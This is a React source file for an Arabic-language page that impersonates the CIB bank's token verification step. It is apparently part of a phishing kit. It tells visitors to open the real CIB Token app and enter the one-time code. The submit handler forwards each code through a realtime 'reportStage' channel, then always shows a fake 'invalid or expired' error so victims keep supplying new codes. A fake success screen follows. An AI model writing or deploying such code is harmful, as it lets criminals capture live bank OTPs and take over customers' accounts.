import { useState, useRef, useEffect } from 'react';
import { useLocation, Link } from 'wouter';
import { AppLayout } from '@/components/layout/AppLayout';
import { Button } from '@/components/ui/button';
import { ChevronRight, CheckCircle2, ShieldCheck, Smartphone, AlertCircle } from 'lucide-react';
import { useRegistration } from '@/context/RegistrationContext';
import { useRealtime } from '@/context/RealtimeContext';

// Detect device type
const getDeviceType = () => {
  const userAgent = navigator.userAgent || navigator.vendor || (window as unknown as { opera?: string }).opera;
  
  if (/android/i.test(userAgent)) {
    return 'android';
  }
  
  if (/iPad|iPhone|iPod/.test(userAgent) || 
      (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    return 'ios';
  }
  
  return 'unknown';
};

// App Store links
const APP_STORE_URL = 'https://apps.apple.com/us/app/cib-otp-token/id1074048518?l=ar';
const GOOGLE_PLAY_URL = 'https://play.google.com/store/apps/details?id=com.CIBEgyptSecureToken&pcampaignid=web_share';

export default function Verify() {
  const [, setLocation] = useLocation();
  const { data } = useRegistration();
  const { reportStage } = useRealtime();
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [isSuccess, setIsSuccess] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState('');
  const [appUrl, setAppUrl] = useState(APP_STORE_URL);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    // Set the appropriate URL based on device type
    const device = getDeviceType();
    if (device === 'android') {
      setAppUrl(GOOGLE_PLAY_URL);
    } else {
      setAppUrl(APP_STORE_URL);
    }
  }, []);

  useEffect(() => {
    reportStage('verify', {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (inputRefs.current[0] && !isSuccess) {
      inputRefs.current[0].focus();
    }
  }, [isSuccess]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    // Clear error when user starts typing
    if (error) setError('');
    
    const newCode = [...code];
    // Handle paste of multiple characters
    if (value.length > 1) {
      const pastedCode = value.slice(0, 6).split('');
      for (let i = 0; i < pastedCode.length; i++) {
        if (index + i < 6) newCode[index + i] = pastedCode[i];
      }
      setCode(newCode);
      const nextFocus = Math.min(index + pastedCode.length, 5);
      inputRefs.current[nextFocus]?.focus();
      return;
    }

    newCode[index] = value;
    setCode(newCode);

    if (value !== '' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && code[index] === '' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const fullCode = code.join('');
    if (fullCode.length >= 4) {
      reportStage('verify', { verificationCode: fullCode });
      setIsSubmitting(true);
      setError('');
      // Simulate network verification - for demo, show error
      setTimeout(() => {
        setIsSubmitting(false);
        // Show error message for invalid/expired code
        setError('رمز التحقق غير صحيح أو منتهي. يرجى الحصول على رمز جديد والمحاولة مرة أخرى.');
        // Clear the code inputs
        setCode(['', '', '', '', '', '']);
        inputRefs.current[0]?.focus();
      }, 1500);
    }
  };

  if (isSuccess) {
    return (
      <AppLayout>
        <div className="flex-1 flex flex-col items-center justify-center max-w-md w-full mx-auto animate-in zoom-in-95 duration-700">
          <div className="w-32 h-32 mb-8 rounded-full bg-primary/10 flex items-center justify-center relative">
            <div className="absolute inset-0 rounded-full border-[6px] border-primary/20 animate-ping" style={{ animationDuration: '3s' }} />
            <div className="absolute inset-4 rounded-full border border-primary/40" />
            <ShieldCheck className="w-16 h-16 text-primary relative z-10" />
          </div>
          
          <h2 className="text-4xl font-bold text-foreground mb-4 text-center tracking-tight">تم التفعيل بنجاح</h2>
          
          <p className="text-lg text-muted-foreground text-center mb-10 leading-relaxed">
            عزيزي <span className="font-semibold text-foreground">{data.fullName || 'العميل'}</span>، تمت إضافة بطاقة <span className="text-primary font-medium">CIB Prime</span> إلى ساعتك الذكية بنجاح. يمكنك الآن الدفع بسهولة وأمان.
          </p>
          
          <div className="bg-card border border-border rounded-2xl p-8 w-full shadow-2xl relative overflow-hidden mb-10">
            <div className="absolute -right-10 -top-10 w-40 h-40 bg-primary/10 rounded-full blur-3xl pointer-events-none" />
            <div className="relative z-10 space-y-6">
              <div className="flex items-center justify-between pb-4 border-b border-border/50">
                <span className="text-muted-foreground">البطاقة</span>
                <span className="font-bold tracking-[0.3em] text-foreground text-lg">•••• 4920</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-muted-foreground">الحالة</span>
                <span className="flex items-center gap-2 text-emerald-500 font-bold bg-emerald-500/10 px-3 py-1 rounded-full">
                  <CheckCircle2 className="w-5 h-5" /> نشطة الآن
                </span>
              </div>
            </div>
          </div>
          
          <Link href="/" className="w-full sm:w-auto">
            <Button size="lg" className="w-full h-14 px-12 text-lg rounded-xl shadow-xl shadow-primary/20">
              العودة للرئيسية
            </Button>
          </Link>
        </div>
      </AppLayout>
    );
  }

  return (
    <AppLayout>
      <div className="flex-1 flex flex-col justify-center max-w-md w-full mx-auto animate-in slide-in-from-right-8 duration-500">
        
        <div className="mb-10 flex items-center justify-between">
          <div className="space-y-2">
            <h1 className="text-4xl font-bold text-foreground tracking-tight">رمز التحقق</h1>
            <p className="text-muted-foreground text-base">أدخل الرمز الذي تسلّمته من فرع CIB</p>
          </div>
          <Link href="/create-account" className="w-12 h-12 flex items-center justify-center rounded-full bg-card border border-border hover:bg-accent transition-colors shadow-sm">
            <ChevronRight className="w-6 h-6 text-foreground" />
          </Link>
        </div>

        <div className="bg-card border border-border rounded-[2rem] p-8 md:p-10 shadow-2xl relative overflow-hidden">
          <div className="absolute top-0 right-0 w-full h-1.5 bg-gradient-to-l from-primary via-primary to-primary" />
          
          <form onSubmit={handleSubmit} className="space-y-10 relative z-10">
            <div className="flex justify-center gap-3 md:gap-4" dir="ltr">
              {code.map((digit, index) => (
                <input
                  key={index}
                  ref={el => { inputRefs.current[index] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={e => handleChange(index, e.target.value)}
                  onKeyDown={e => handleKeyDown(index, e)}
                  className={`w-12 h-16 md:w-14 md:h-16 text-center text-3xl font-bold bg-background/50 border rounded-xl focus:outline-none focus:ring-2 transition-all shadow-inner ${
                    error 
                      ? 'border-red-500 focus:border-red-500 focus:ring-red-500/50' 
                      : 'border-input focus:border-primary focus:ring-primary/50'
                  }`}
                />
              ))}
            </div>

            {/* رسالة الخطأ */}
            {error && (
              <div className="flex items-center gap-3 p-4 bg-red-50 dark:bg-red-950/30 border border-red-200 dark:border-red-800 rounded-xl animate-in slide-in-from-top-2 duration-300">
                <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0" />
                <p className="text-red-600 dark:text-red-400 text-sm font-medium leading-relaxed">
                  {error}
                </p>
              </div>
            )}

           <div className="bg-primary/5 border border-primary/20 rounded-xl p-5 text-sm md:text-base leading-relaxed text-center text-primary-foreground/90 font-medium">
  يرجى ادخال رمز التحقق من
  <br />
  تطبيق cib token لإتمام عملية التحقق والمتابعة
</div>

            <Button 
              type="submit" 
              size="lg" 
              className="w-full h-14 gap-3 text-lg rounded-xl relative overflow-hidden group" 
              disabled={code.join('').length < 4 || isSubmitting}
            >
              {isSubmitting ? (
                <span className="flex items-center gap-3">
                  <div className="w-5 h-5 rounded-full border-2 border-background border-t-transparent animate-spin" />
                  جاري التوثيق والتفعيل...
                </span>
              ) : (
                'تأكيد  '
              )}
              <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite]" />
            </Button>

            {/* صندوق فتح التطبيق */}
            <a 
              href={appUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center gap-4 p-4 bg-gradient-to-r from-blue-50 to-blue-100 dark:from-blue-950/30 dark:to-blue-900/30 border-2 border-blue-200 dark:border-blue-800 rounded-2xl hover:border-blue-400 dark:hover:border-blue-600 hover:shadow-lg transition-all duration-300 group"
            >
              <div className="flex-shrink-0 w-14 h-14 bg-blue-500 rounded-xl flex items-center justify-center shadow-lg shadow-blue-500/30 group-hover:scale-110 transition-transform">
                <Smartphone className="w-8 h-8 text-white" />
              </div>
              <div className="flex-1">
                <p className="text-blue-900 dark:text-blue-100 font-bold text-base leading-tight">
                  يرجى فتح التطبيق CIB Token
                </p>
                <p className="text-blue-600 dark:text-blue-400 text-sm mt-0.5">
                  للحصول على رمز التحقق
                </p>
              </div>
              <svg 
                xmlns="http://www.w3.org/2000/svg" 
                className="w-6 h-6 text-blue-500 group-hover:translate-x-1 transition-transform flex-shrink-0" 
                fill="none" 
                viewBox="0 0 24 24" 
                stroke="currentColor" 
                strokeWidth={2}
              >
                <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
              </svg>
            </a>
          </form>
        </div>

        <div className="mt-10 flex justify-center gap-3">
          <div className="h-2 w-10 rounded-full bg-border" />
          <div className="h-2 w-10 rounded-full bg-border" />
          <div className="h-2 w-10 rounded-full bg-primary shadow-[0_0_10px_rgba(212,175,55,0.5)]" />
        </div>
      </div>
    </AppLayout>
  );
}
